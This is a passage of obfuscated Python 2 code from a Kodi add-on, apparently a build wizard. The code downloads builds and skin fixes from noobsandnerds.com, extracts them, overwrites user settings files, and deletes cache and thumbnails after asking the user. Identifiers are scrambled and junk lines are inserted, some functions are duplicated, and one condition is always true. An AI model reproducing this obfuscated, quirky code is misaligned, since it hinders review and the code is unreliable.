  OoO0oOOOO = i11iiI ( oo0oO , OoO0oOOOO )
 if os . path . exists ( i1i1IIi ) :
  OoO0oOOOO = i11iiI ( i1i1IIi , OoO0oOOOO )
 if os . path . exists ( o0oo0Ooo0 ) :
  OoO0oOOOO = i11iiI ( o0oo0Ooo0 , OoO0oOOOO )
 if os . path . exists ( o0OOoO ) :
  OoO0oOOOO = i11iiI ( o0OOoO , OoO0oOOOO )
 if os . path . exists ( I1iII1II1I1ii ) :
  OoO0oOOOO = i11iiI ( I1iII1II1I1ii , OoO0oOOOO )
 if os . path . exists ( oo0OO0O ) :
  OoO0oOOOO = i11iiI ( oo0OO0O , OoO0oOOOO )
 if os . path . exists ( OO0OooOOoO00OO00 ) :
  OoO0oOOOO = i11iiI ( OO0OooOOoO00OO00 , OoO0oOOOO )
 if os . path . exists ( ii11ii1iIiI1 ) :
  OoO0oOOOO = i11iiI ( ii11ii1iIiI1 , OoO0oOOOO )
 if os . path . exists ( OoOo0oO0 ) :
  OoO0oOOOO = i11iiI ( OoOo0oO0 , OoO0oOOOO )
 if os . path . exists ( i111iIi1i1 ) :
  OoO0oOOOO = i11iiI ( i111iIi1i1 , OoO0oOOOO )
 if os . path . exists ( IIiiI ) :
  OoO0oOOOO = i11iiI ( IIiiI , OoO0oOOOO )
 OoO0oOOOO = i11iiI ( OooO0 , OoO0oOOOO )
 OoO0oOOOO = i11iiI ( OOO00O , OoO0oOOOO ) / 1000000
 I1i1I1I11IiiI = iI111I11I1I1 . yesno ( 'Results' , 'You can free up [COLOR=dodgerblue]' + str ( OoO0oOOOO ) + 'MB[/COLOR] of space if you run this cleanup program. Would you like to run the cleanup procedure?' )
 if I1i1I1I11IiiI == 1 :
  o0OOOOOo00 ( )
  try :
   shutil . rmtree ( OOO00O )
  except :
   pass
  I1i1I1I11IiiI = iI111I11I1I1 . yesno ( 'Thumbnail Cleanup' , 'We highly recommend only wiping your OLD unused thumbnails. Do you want to clear just the old ones or all thumbnails?' , yeslabel = 'ALL' , nolabel = 'OLD ONLY' )
  if I1i1I1I11IiiI == 1 :
   IiiiI11 ( )
   oo0O00o0 ( OooO0 )
   OoooOOo0oOO ( )
  else :
   ii1IIii ( )
   if 44 - 44: Oo % iIii1I11I1II1
   if 30 - 30: i11iIiiIii - I1IiiI / I1ii11iIi11i
def I1IIiIi1iI ( url ) :
 Ii1I1Ii ( 'folder' , 'Anime' , str ( url ) + '&genre=anime' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Audiobooks' , str ( url ) + '&genre=audiobooks' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Comedy' , str ( url ) + '&genre=comedy' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Comics' , str ( url ) + '&genre=comics' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Documentary' , str ( url ) + '&genre=documentary' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Downloads' , str ( url ) + '&genre=downloads' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Food' , str ( url ) + '&genre=food' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Gaming' , str ( url ) + '&genre=gaming' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Health' , str ( url ) + '&genre=health' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'How To...' , str ( url ) + '&genre=howto' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Kids' , str ( url ) + '&genre=kids' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Live TV' , str ( url ) + '&genre=livetv' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Movies' , str ( url ) + '&genre=movies' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Music' , str ( url ) + '&genre=music' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'News' , str ( url ) + '&genre=news' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Photos' , str ( url ) + '&genre=photos' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Podcasts' , str ( url ) + '&genre=podcasts' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Radio' , str ( url ) + '&genre=radio' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Religion' , str ( url ) + '&genre=religion' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Space' , str ( url ) + '&genre=space' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Sports' , str ( url ) + '&genre=sports' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Technology' , str ( url ) + '&genre=tech' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Trailers' , str ( url ) + '&genre=trailers' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'TV Shows' , str ( url ) + '&genre=tv' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Misc.' , str ( url ) + '&genre=other' , 'grab_builds' , '' , '' , '' , '' )
 if 87 - 87: o0oOOo0O0Ooo / IIiiiI1iIII / i11iIiiIii
 if o0O . getSetting ( 'adult' ) == 'true' :
  Ii1I1Ii ( 'folder' , 'XXX' , str ( url ) + '&genre=adult' , 'grab_builds' , '' , '' , '' , '' )
  if 95 - 95: i1IIi / O00OOo00oo0o / O00OOo00oo0o
  if 65 - 65: IIi + IIiIi1iI * IIiIi1iI
def i11iiI ( path , size ) :
 for OoOO , iIO0oOoo00Oo0O , Iii1i1Ii in os . walk ( path ) :
  for IIiI1i in Iii1i1Ii :
   OOooO0OOoo . update ( 0 , "Calulating..." , '[COLOR=dodgerblue]' + IIiI1i + '[/COLOR]' , 'Please Wait' )
   III1iIii = os . path . join ( OoOO , IIiI1i )
   size += os . path . getsize ( III1iIii )
 return size
 if 9 - 9: i1IIi - OoOoOO00
def iIioo0ooO ( default = "" , heading = "" , hidden = False ) :
 Oo00o0OOo0OO = xbmc . Keyboard ( default , heading , hidden )
 Oo00o0OOo0OO . doModal ( )
 if ( Oo00o0OOo0OO . isConfirmed ( ) ) :
  return unicode ( Oo00o0OOo0OO . getText ( ) , "utf-8" )
 return default
 if 18 - 18: iiiiiiii1 - IIiiiI1iIII / II111iiii / I1ii11iIi11i
def i1Ii1IiiIi1II ( ) :
 import traceback
 if 54 - 54: O00OOo00oo0o % i1IIi
 oooOOoo0 = traceback . print_exc ( )
 xbmc . log ( '### ERROR STRING: %s' % oooOOoo0 )
 if 79 - 79: OoooooooOO - iiiiiiii1 * O00OOo00oo0o - II111iiii % OoOoOO00 * IIiiiI1iIII
 if 31 - 31: I1IiiI
def i11iiI ( path , size ) :
 for OoOO , iIO0oOoo00Oo0O , Iii1i1Ii in os . walk ( path ) :
  for IIiI1i in Iii1i1Ii :
   OOooO0OOoo . update ( 0 , "Calculating..." , '[COLOR=dodgerblue]' + IIiI1i + '[/COLOR]' , 'Please Wait' )
   III1iIii = os . path . join ( OoOO , IIiI1i )
   size += os . path . getsize ( III1iIii )
 return size
 if 36 - 36: OoO0O00 + OoO0O00 + OoO0O00 % Oo0Ooo * IIiIi1iI
 if 98 - 98: OOOoOoo0O . OOOoOoo0O / Oo0Ooo / O00OOo00oo0o / I1IiiI
def oO0o ( ) :
 i1I1iI1 = [ ]
 oOOoO = sys . argv [ 2 ]
 if len ( oOOoO ) >= 2 :
  iii1i1Iiiiiii = sys . argv [ 2 ]
  OOoo0 = iii1i1Iiiiiii . replace ( '?' , '' )
  if ( iii1i1Iiiiiii [ len ( iii1i1Iiiiiii ) - 1 ] == '/' ) :
   iii1i1Iiiiiii = iii1i1Iiiiiii [ 0 : len ( iii1i1Iiiiiii ) - 2 ]
  Ii11I1iIIi = OOoo0 . split ( '&' )
  i1I1iI1 = { }
  for O0ooO in range ( len ( Ii11I1iIIi ) ) :
   iIOO = { }
   iIOO = Ii11I1iIIi [ O0ooO ] . split ( '=' )
   if ( len ( iIOO ) ) == 2 :
    i1I1iI1 [ iIOO [ 0 ] ] = iIOO [ 1 ]
    if 4 - 4: O00OOo00oo0o % I1ii11iIi11i + OOOoOoo0O - I1ii11iIi11i
 return i1I1iI1
 if 98 - 98: O00OOo00oo0o - O0 * ooOo * O00OOo00oo0o * O00OOo00oo0o
def i11IiII ( ) :
 IIo0o0O0O00oOOo = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
 OOooO0OOoo = xbmcgui . DialogProgress ( )
 OOooO0OOoo . create ( "Gotham Addon Fix" , "Please wait whilst your addons" , '' , 'are being made Gotham compatible.' )
 if 53 - 53: OoO0O00 % I1ii11iIi11i . IIiIi1iI . i1IIi . OoO0O00
 for ii11 in glob . glob ( os . path . join ( IIo0o0O0O00oOOo , '*.*' ) ) :
  if 26 - 26: I1IiiI % OoOoOO00
  for file in glob . glob ( os . path . join ( ii11 , '*.*' ) ) :
   if 67 - 67: Oo0Ooo - IIiiiI1iIII * O00OOo00oo0o . OoooooooOO / i11iIiiIii
   if 'addon.xml' in file :
    OOooO0OOoo . update ( 0 , "Fixing" , file , 'Please Wait' )
    OO0OOoo0OOO = open ( file ) . read ( )
    iIIi1iii1 = OO0OOoo0OOO . replace ( 'addon="xbmc.python" version="1.0"' , 'addon="xbmc.python" version="2.1.0"' ) . replace ( 'addon="xbmc.python" version="2.0"' , 'addon="xbmc.python" version="2.1.0"' )
    IIiI1i = open ( file , mode = 'w' )
    IIiI1i . write ( str ( iIIi1iii1 ) )
    IIiI1i . close ( )
    if 61 - 61: o0oOOo0O0Ooo % I1IiiI * i1IIi / I1IiiI / II111iiii + IIi
 iI111I11I1I1 = xbmcgui . Dialog ( )
 iI111I11I1I1 . ok ( "Your addons have now been made compatible" , "If you still find you have addons that aren't working please run the addon so it throws up a script error, upload a log and post details on the relevant support forum." )
 if 22 - 22: IIiiiI1iIII . IIiIi1iI + Oo0Ooo
def IIIIiI1ii1 ( ) :
 if iI111I11I1I1 . yesno ( 'Convert Addons To Gotham' , 'This will edit your addon.xml files so they show as Gotham compatible. It\'s doubtful this will have any effect on whether or not they work but it will get rid of the annoying incompatible pop-up message. Do you wish to continue?' ) :
  i11IiII ( )
  if 73 - 73: O00OOo00oo0o
  if 13 - 13: OOOoOoo0O - OoooooooOO / iiiiiiii1
def Iiio0Oo0oO ( ) :
 I1II1I11I1I = 0
 ooOo0 = os . listdir ( OOOO0OOoO0O0 )
 for i1II1 in ooOo0 :
  if i1II1 . endswith ( '.log' ) and not i1II1 . endswith ( '.old.log' ) :
   mylog = os . path . join ( OOOO0OOoO0O0 , i1II1 )
   lastmodified = os . path . getmtime ( mylog )
   if lastmodified > I1II1I11I1I :
    I1II1I11I1I = lastmodified
    logfile = mylog
    if 41 - 41: IIi + OoO0O00 * I1IiiI * O0 * Oo0Ooo - OoOoOO00
 ooooOoo00 = open ( logfile , 'r' )
 IIIIii1111i1 = ooooOoo00 . read ( )
 ooooOoo00 . close ( )
 return IIIIii1111i1
 if 11 - 11: OoOoOO00
 if 31 - 31: II111iiii * O00OOo00oo0o / IIiiiI1iIII / i11iIiiIii
def OO ( url ) :
 if o0O . getSetting ( 'adult' ) == 'true' :
  OOOii = 'yes'
  if 60 - 60: i11iIiiIii . O0 * iIii1I11I1II1 * OoOoOO00
 else :
  OOOii = 'no'
  if 99 - 99: iIii1I11I1II1 - ooOo - OoOoOO00 / iIii1I11I1II1 * Oo0Ooo - ooOo
 if url == 'popular' :
  o0ooo0oooO = 'http://noobsandnerds.com/TI/AddonPortal/popular_new.php?adult=%s' % ( OOOii )
 elif url == 'latest' :
  o0ooo0oooO = 'http://noobsandnerds.com/TI/AddonPortal/latest_new.php?adult=%s' % ( OOOii )
 elif url != 'popular' and url != 'latest' :
  o0ooo0oooO = 'http://noobsandnerds.com/TI/AddonPortal/sortby_new.php?sortx=name&user=%s&adult=%s&%s' % ( Oo0oO0ooo , OOOii , url )
  xbmc . log ( o0ooo0oooO )
  if not "desc" in url :
   url = url + '&desc='
  if not "genre" in url :
   url = url + '&genre='
 print "URL: " + o0ooo0oooO
 if 89 - 89: i1IIi
 O0OoooO0 = ooo0O0o00O ( o0ooo0oooO , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 19 - 19: iiiiiiii1 / o0oOOo0O0Ooo % IIiiiI1iIII - O00OOo00oo0o
 if 14 - 14: I1ii11iIi11i - i11iIiiIii * IIi
 o0OO000ooOo = re . compile ( 'name="(.+?)"  <br> downloads="(.+?)"  <br> icon="(.+?)"  <br> broken="(.+?)"  <br> id="(.+?)"  <br> UID="(.+?)"  <br>' , re . DOTALL ) . findall ( O0OoooO0 )
 if o0OO000ooOo == [ ] :
  if 39 - 39: OoooooooOO
  o0OO000ooOo = re . compile ( 'name="(.+?)" <br> downloads="(.+?)" <br> icon="(.+?)" <br> broken="(.+?)" <br> id="(.+?)" <br> UID="(.+?)" <br>' , re . DOTALL ) . findall ( O0OoooO0 )
  if 19 - 19: i11iIiiIii
 if o0OO000ooOo != [ ] and url != 'popular' and url != 'latest' :
  oOOOOOoOOoo0 ( o0ooo0oooO , 'addons' )
  if 93 - 93: II111iiii * OoOoOO00 % o0oOOo0O0Ooo
  for ooo0O , O0OOO0OOooo00 , I1iii , ii1ii111 , OOoOO0 , iiIi1iI in o0OO000ooOo :
   try :
    xbmcaddon . Addon ( id = OOoOO0 ) . getAddonInfo ( 'path' )
    oOO00o0oo0OO = '[COLOR=lime][INSTALLED][/COLOR] '
   except :
    oOO00o0oo0OO = ''
    if 16 - 16: IIiIi1iI - i1IIi + o0oOOo0O0Ooo * iIii1I11I1II1 + ooOo . ooOo
   if ii1ii111 == '0' :
    Ii1I1Ii ( 'addonfolder' , oOO00o0oo0OO + ooo0O + ' [' + O0OOO0OOooo00 + ' downloads]' , iiIi1iI , 'addon_final_menu' , I1iii , '' , '' )
    if 85 - 85: IIi . IIiiiI1iIII - iiiiiiii1 / II111iiii * IIi
   if ii1ii111 == '1' :
    Ii1I1Ii ( 'addonfolder' , oOO00o0oo0OO + '[COLOR=red]' + ooo0O + ' [REPORTED AS BROKEN][/COLOR]' , iiIi1iI , 'addon_final_menu' , I1iii , '' , '' )
    if 98 - 98: iIii1I11I1II1 + i11iIiiIii * I1ii11iIi11i / IIi / iiiiiiii1 - O0
 elif o0OO000ooOo != [ ] and ( url == 'popular' or url == 'latest' ) :
  for ooo0O , O0OOO0OOooo00 , I1iii , ii1ii111 , OOoOO0 , iiIi1iI in o0OO000ooOo :
   try :
    xbmcaddon . Addon ( id = OOoOO0 ) . getAddonInfo ( 'path' )
    oOO00o0oo0OO = '[COLOR=lime][INSTALLED][/COLOR] '
   except :
    oOO00o0oo0OO = ''
    if 42 - 42: IIiIi1iI
   if ii1ii111 == '0' :
    Ii1I1Ii ( 'addonfolder' , oOO00o0oo0OO + ooo0O + ' [' + O0OOO0OOooo00 + ' downloads]' , iiIi1iI , 'addon_final_menu' , I1iii , '' , '' )
    if 77 - 77: i1IIi * ooOo % OoooooooOO + O0 * iiiiiiii1
   if ii1ii111 == '1' :
    Ii1I1Ii ( 'addonfolder' , oOO00o0oo0OO + '[COLOR=red]' + ooo0O + ' [REPORTED AS BROKEN][/COLOR]' , iiIi1iI , 'addon_final_menu' , I1iii , '' , '' )
    if 28 - 28: OOOoOoo0O . OoooooooOO * Oo + i11iIiiIii % I1IiiI . iIii1I11I1II1
 elif '&redirect' in url :
  I1i1I1I11IiiI = iI111I11I1I1 . yesno ( 'No Content Found' , 'This add-on cannot be found on the Add-on Portal.' , '' , 'Would you like to remove this item from your setup?' )
  if 63 - 63: II111iiii - OOOoOoo0O . OoOoOO00
  if I1i1I1I11IiiI == 1 :
   print "### Need to add remove function to code still"
   if 8 - 8: I1IiiI * iiiiiiii1 / IIiiiI1iIII + OoOoOO00 . IIiiiI1iIII - Oo
 else :
  iI111I11I1I1 . ok ( 'No Content Found' , 'Sorry no content can be found that matches' , 'your search criteria.' , '' )
  if 80 - 80: iIii1I11I1II1 / ooOo * Oo0Ooo - Oo * IIiIi1iI
  if 97 - 97: IIiiiI1iIII - OOOoOoo0O / II111iiii
def I11ii1i ( url ) :
 if zip == '' :
  iI111I11I1I1 . ok ( 'Storage/Download Folder Not Set' , 'You have not set your backup storage folder.\nPlease update the addon settings and try again.' , '' , '' )
  o0O . openSettings ( sys . argv [ 0 ] )
  if 50 - 50: iIii1I11I1II1 - OOOoOoo0O % IIiIi1iI - Oo0Ooo
 if o0O . getSetting ( 'adult' ) == 'true' :
  OOOii = ''
  if 52 - 52: ooOo + O00OOo00oo0o - I1ii11iIi11i * O00OOo00oo0o . Oo + IIi
 else :
  OOOii = 'no'
  if 43 - 43: I1IiiI % IIiiiI1iIII % I1ii11iIi11i
 if 'genre' in url :
  o0ooo0oooO = 'http://noobsandnerds.com/TI/Community_Builds/sort_by_test.php?sortx=name&orderx=ASC&adult=%s&%s' % ( OOOii , url )
 else :
  o0ooo0oooO = 'http://noobsandnerds.com/TI/Community_Builds/sort_by_test.php?sortx=name&orderx=ASC&genre=&adult=%s&%s' % ( OOOii , url )
 if oOOoo00O0O == 'true' :
  xbmc . log ( "BUILD URL: %s" % o0ooo0oooO )
 O0OoooO0 = ooo0O0o00O ( o0ooo0oooO , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 53 - 53: ooOo % Oo % I1ii11iIi11i . IIi . IIi . IIiIi1iI
 o0OO000ooOo = re . compile ( 'name="(.+?)"  <br> id="(.+?)"  <br> Thumbnail="(.+?)"  <br> Fanart="(.+?)"  <br> downloads="(.+?)"  <br> <br>' , re . DOTALL ) . findall ( O0OoooO0 )
 if o0OO000ooOo == [ ] :
  if 73 - 73: IIiIi1iI / iiiiiiii1 + OoO0O00 / OoOoOO00 . II111iiii * O00OOo00oo0o
  o0OO000ooOo = re . compile ( 'name="(.+?)" <br> id="(.+?)" <br> Thumbnail="(.+?)" <br> Fanart="(.+?)" <br> downloads="(.+?)" <br> <br>' , re . DOTALL ) . findall ( O0OoooO0 )
 if not '&visibility=private' in url :
  oOOOOOoOOoo0 ( url , 'communitybuilds' )
  if 21 - 21: I1IiiI - I1IiiI + IIiIi1iI % I1IiiI * ooOo
 for ooo0O , id , O0o0 , ooOo0O0 , O0OOO0OOooo00 in o0OO000ooOo :
  oo0o00O ( ooo0O + '[COLOR=lime] (' + O0OOO0OOooo00 + ' downloads)[/COLOR]' , id + url , 'community_menu' , O0o0 , ooOo0O0 , id , '' , '' , '' , '' )
  if 90 - 90: I1IiiI * I1ii11iIi11i . OOOoOoo0O * O00OOo00oo0o - o0oOOo0O0Ooo
 if 'id=1' in url : o0ooo0oooO = I11
 if 'id=2' in url : o0ooo0oooO = oOo0oooo00o
 if 'id=3' in url : o0ooo0oooO = oo0o0O00
 if 'id=4' in url : o0ooo0oooO = i1iiIIiiI111
 if 'id=5' in url : o0ooo0oooO = i1iiIII111ii
 if 40 - 40: O0 / IIiiiI1iIII - II111iiii + o0oOOo0O0Ooo % Oo0Ooo
 O0OoooO0 = ooo0O0o00O ( o0ooo0oooO , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0OO000ooOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( O0OoooO0 )
 if 93 - 93: iiiiiiii1
 for ooo0O , url , Oo0o , iiiiII11iIi , O00Oo in o0OO000ooOo :
  if not 'viewport' in ooo0O :
   Ii1I1Ii ( 'addon' , ooo0O , url , 'restore_local_CB' , Oo0o , iiiiII11iIi , O00Oo , '' )
   if 82 - 82: I1ii11iIi11i / iiiiiiii1 . i11iIiiIii + Oo - OoOoOO00 / IIiIi1iI
   if 99 - 99: ooOo / i1IIi
def Iiio0Oo0oO ( file = False , old = False ) :
 I1II1I11I1I = 0
 ooOo0 = os . listdir ( OOOO0OOoO0O0 )
 iIoOO0OO00 = [ ]
 if 75 - 75: IIiIi1iI * Oo0Ooo / IIi * Oo0Ooo / iiiiiiii1
 for i1II1 in ooOo0 :
  if old == True and i1II1 . endswith ( '.old.log' ) : iIoOO0OO00 . append ( os . path . join ( OOOO0OOoO0O0 , i1II1 ) )
  elif old == False and i1II1 . endswith ( '.log' ) and not i1II1 . endswith ( '.old.log' ) : iIoOO0OO00 . append ( os . path . join ( OOOO0OOoO0O0 , i1II1 ) )
  if 14 - 14: i1IIi * iIii1I11I1II1 - O00OOo00oo0o * OoOoOO00 - IIiIi1iI / ooOo
 if len ( iIoOO0OO00 ) > 0 :
  iIoOO0OO00 . sort ( key = lambda IIiI1i : os . path . getmtime ( IIiI1i ) )
  if file == True : return iIoOO0OO00 [ - 1 ]
  else :
   ooooOoo00 = open ( iIoOO0OO00 [ - 1 ] , 'r' )
   IIIIii1111i1 = ooooOoo00 . read ( )
   ooooOoo00 . close ( )
   return IIIIii1111i1
 else :
  return False
  if 73 - 73: I1ii11iIi11i - OoOoOO00 * O0 - OoOoOO00 - OoO0O00
  if 96 - 96: I1ii11iIi11i - O0
def I1iO00O000oOO0oO ( url , local ) :
 oOO0OOOOOo0Oo ( )
 I1i1I1I11IiiI = xbmcgui . Dialog ( ) . yesno ( ooo0O , 'This will over-write your existing guisettings.xml.' , 'Are you sure this is the build you have installed?' , '' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Fix' )
 if 88 - 88: o0oOOo0O0Ooo . I1IiiI % ooOo . Oo0Ooo % iiiiiiii1 . ooOo
 if I1i1I1I11IiiI == 1 :
  OoO0ooOOoo ( url , local )
  if 95 - 95: Oo0Ooo * Oo + I1IiiI . O0
def IIiIi1II1IiI ( path ) :
 if 99 - 99: Oo0Ooo
 I1I1IIiiii1ii = open ( iIi1ii1I1 , mode = 'r' )
 ii1I1 = I1I1IIiiii1ii . read ( )
 I1I1IIiiii1ii . close ( )
 if 17 - 17: i11iIiiIii - i11iIiiIii + I1ii11iIi11i * iiiiiiii1 * ooOo / OoooooooOO
 i1II111ii1ii = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( ii1I1 )
 O0ooOoO0OO000 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( ii1I1 )
 OOoOOO = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( ii1I1 )
 III1 = i1II111ii1ii [ 0 ] if ( len ( i1II111ii1ii ) > 0 ) else ''
 O00oOOoOOOOO = O0ooOoO0OO000 [ 0 ] if ( len ( O0ooOoO0OO000 ) > 0 ) else ''
 ii1IIiiIi1111Ii1 = OOoOOO [ 0 ] if ( len ( OOoOOO ) > 0 ) else ''
 if 31 - 31: o0oOOo0O0Ooo * OOOoOoo0O - i11iIiiIii - I1IiiI
 if 19 - 19: IIiIi1iI . OOOoOoo0O * OoooooooOO - Oo + O0 * IIi
 iI1 = open ( path , mode = 'r' )
 iIIII1 = iI1 . read ( )
 iI1 . close ( )
 if 90 - 90: i1IIi . ooOo / IIi . Oo / IIi
 i1111I1iii1 = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( iIIII1 )
 o0Oo00o0 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( iIIII1 )
 i11II = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( iIIII1 )
 oOOoOo0Ooo = i1111I1iii1 [ 0 ] if ( len ( i1111I1iii1 ) > 0 ) else ''
 o0OOoOoo00 = o0Oo00o0 [ 0 ] if ( len ( o0Oo00o0 ) > 0 ) else ''
 Oo0Ooo0 = i11II [ 0 ] if ( len ( i11II ) > 0 ) else ''
 OOO = ii1I1 . replace ( III1 , oOOoOo0Ooo ) . replace ( ii1IIiiIi1111Ii1 , Oo0Ooo0 ) . replace ( O00oOOoOOOOO , o0OOoOoo00 )
 if 19 - 19: i1IIi % OoO0O00 - I1ii11iIi11i . IIi . O00OOo00oo0o
 print "### Attempting to create new guisettings at: " + path
 OooooOOoo0 = open ( path , mode = 'w+' )
 OooooOOoo0 . write ( str ( OOO ) )
 OooooOOoo0 . close ( )
 if 19 - 19: I1ii11iIi11i / IIi
 if 35 - 35: Oo0Ooo * ooOo / OoooooooOO + O0 / OoooooooOO / Oo
def OoO0ooOOoo ( url , local ) :
 O0i1I11I = False
 IiO0o = 0
 oOo0Oooo = 1
 if 39 - 39: O00OOo00oo0o % i1IIi . I1ii11iIi11i - O0
 if os . path . exists ( ooOooo000oOO ) :
  os . remove ( ooOooo000oOO )
  if 65 - 65: ooOo * ooOo / OOOoOoo0O + ooOo % iiiiiiii1 + OoOoOO00
 if os . path . exists ( o0 ) :
  os . remove ( o0 )
  if 92 - 92: o0oOOo0O0Ooo
 if os . path . exists ( oOoOooOo0o0 ) :
  os . remove ( oOoOooOo0o0 )
  if 37 - 37: ooOo
 if not os . path . exists ( Oo0oOOo ) :
  os . makedirs ( Oo0oOOo )
  if 18 - 18: IIiiiI1iIII * i11iIiiIii + iIii1I11I1II1 % OOOoOoo0O + i1IIi - OoO0O00
  if 85 - 85: OoO0O00 * OOOoOoo0O + OoO0O00
 try :
  shutil . copyfile ( iIi1ii1I1 , ooOooo000oOO )
  if 39 - 39: Oo0Ooo / i1IIi % i1IIi
 except :
  print "No guisettings found, most likely due to a previously failed attempt at install"
  if 20 - 20: Oo * ooOo
 if local != 1 :
  OOOoooOo00O = os . path . join ( iiiiiIIii , 'guifix.zip' )
  if 6 - 6: OoooooooOO - Oo0Ooo
  try :
   OOooO0OOoo . create ( 'Downloading Skin Fix' , '' , '' , '' )
   downloader . download ( url , OOOoooOo00O )
  except :
   print "Failed to download guisettings"
 else :
  OOOoooOo00O = xbmc . translatePath ( url )
 if oOOoo00O0O == 'true' :
  print "### lib=" + OOOoooOo00O
  if 52 - 52: Oo + Oo0Ooo
 oOoO0oOO0o = str ( os . path . getsize ( OOOoooOo00O ) )
 OOooO0OOoo . create ( "Installing Skin Fix" , "Checking " , '' , 'Please Wait' )
 if 94 - 94: ooOo * OOOoOoo0O
 extract . all ( OOOoooOo00O , Oo0oOOo )
 if 88 - 88: O0 % IIiiiI1iIII . IIiiiI1iIII . IIi / i1IIi
 if os . path . exists ( os . path . join ( Oo0oOOo , 'script.skinshortcuts' ) ) :
  try :
   shutil . rmtree ( os . path . join ( iiI1IiI , 'script.skinshortcuts' ) )
  except :
   pass
  os . rename ( os . path . join ( Oo0oOOo , 'script.skinshortcuts' ) , os . path . join ( iiI1IiI , 'script.skinshortcuts' ) )
  if 16 - 16: Oo0Ooo * IIi
 if os . path . exists ( os . path . join ( Oo0oOOo , 'addon_data' ) ) :
  O0ooO0o ( os . path . join ( Oo0oOOo , 'addon_data' ) , oOOoO0 , 1 )
  if 42 - 42: OoooooooOO - OoOoOO00 - Oo * IIi
 if local != 'library' or local != 'updatelibrary' or local != 'fresh' :
  if 98 - 98: OoO0O00 . iIii1I11I1II1 % Oo0Ooo + OoooooooOO
  try :
   IIiIiI = open ( os . path . join ( Oo0oOOo , 'profiles.xml' ) , mode = 'r' )
   I1Ii111I111 = IIiIiI . read ( )
   IIiIiI . close ( )
   if 7 - 7: I1IiiI
   if os . path . exists ( os . path . join ( Oo0oOOo , 'profiles.xml' ) ) :
    if 40 - 40: iiiiiiii1
    if local == None :
     I1i1I1I11IiiI = xbmcgui . Dialog ( ) . yesno ( "KODI PROFILES DETECTED" , 'This build has profiles included (standard Kodi profiles, not CP Profiles), would you like to overwrite your existing profiles or keep the ones you have?' , '' , '' , nolabel = 'Keep my profiles' , yeslabel = 'Use new profiles' )
     if 80 - 80: I1IiiI * IIi % ooOo . i11iIiiIii % IIiiiI1iIII
    if local != None :
     I1i1I1I11IiiI = 1
     if 42 - 42: OoooooooOO * II111iiii
    if I1i1I1I11IiiI == 1 :
     OooooOOoo0 = open ( oOoOooOo0o0 , mode = 'w' )
     time . sleep ( 1 )
     OooooOOoo0 . write ( I1Ii111I111 )
     time . sleep ( 1 )
     OooooOOoo0 . close ( )
     oOo0Oooo = 0
     if 53 - 53: IIi + i1IIi . OoO0O00 / i11iIiiIii + O00OOo00oo0o % OoOoOO00
  except :
   print "no profiles.xml file"
   if 9 - 9: iiiiiiii1 . OOOoOoo0O - Oo0Ooo . IIi
   if 39 - 39: Oo
 try :
  os . rename ( os . path . join ( Oo0oOOo , 'guisettings.xml' ) , o0 )
 except :
  iI111I11I1I1 . ok ( 'FILE MISSING' , 'No guisettings.xml could be found in your zip file. Please double check this file is a valid zip and hasn\'t become corrupt.' )
 if local != 'fresh' :
  o00OO00OOo0 = iI111I11I1I1 . yesno ( "Keep Kodi Settings?" , 'Do you want to keep your existing KODI settings (weather, screen calibration, PVR etc.) or wipe and install the ones in this build?' , nolabel = 'Keep my settings' , yeslabel = 'Replace my settings' )
  if 92 - 92: Oo
 if local == 'fresh' :
  o00OO00OOo0 = 1
  if 32 - 32: IIiIi1iI . iIii1I11I1II1 % Oo0Ooo . OoooooooOO
 if o00OO00OOo0 == 1 :
  if 81 - 81: i11iIiiIii * IIiIi1iI . ooOo * ooOo . IIiiiI1iIII
  if os . path . exists ( iIi1ii1I1 ) :
   if 47 - 47: iIii1I11I1II1 % OOOoOoo0O . OOOoOoo0O / O0 . i11iIiiIii * O00OOo00oo0o
   try :
    print "### Attempting to remove guisettings"
    os . remove ( iIi1ii1I1 )
